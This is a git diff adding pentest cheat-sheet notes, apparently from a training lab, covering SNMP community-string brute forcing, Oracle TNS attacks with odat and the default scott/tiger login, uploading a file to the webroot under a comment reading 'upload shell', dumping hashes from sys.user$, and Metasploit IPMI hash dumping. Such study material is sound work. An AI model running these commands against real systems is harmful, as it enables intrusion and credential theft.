@@ -110,7 +110,6 @@ openssl s_client -connect 10.129.14.128:pop3s
 
 openssl s_client -connect 10.129.14.128:imaps
 ```
-### IMAP
 ```bash
 telnet <ip> 143
 
@@ -123,3 +122,56 @@ a fetch <NUMBER> body[text]
 a LOGOUT
 ```
 - 메일박스를 선택할 때 대소문자 구별해서 선택해야 한다.
+
+## SNMP
+```bash
+snmpwalk -v2c -c public 10.129.14.128
+
+snmpbulkwalk -c public -v2c 10.10.10.10 . > result
+
+snmpbulkwalk -c <community strings> -v2c <ip> . > result
+
+# Find Community Strings
+onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
+```
+- `snmpbulkwalk`는 v2부터 사용할 수 있음.
+
+## MSSQL
+```bash
+# MSSQL default database
+master
+model
+msdb
+tempdb
+resource
+```
+
+## Oracle TNS(1521 port)
+```bash
+sudo odat.py all -s 10.129.204.235
+
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+
+sqlplus scott/tiger@10.129.204.235/<oracle sid from nmap>
+
+sqlplus scott/tiger@10.129.204.235/<oracle sid from nmap> as sysdba
+
+# upload shell
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+##### in SQL
+select table_name from all_tables;
+select * from user_role_privs;
+select name, password from sys.user$;
+#####
+```
+
+## IPMI(623 UDP port)
+```bash
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+
+# metasploit
+use auxiliary/scanner/ipmi/ipmi_version
+
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+```
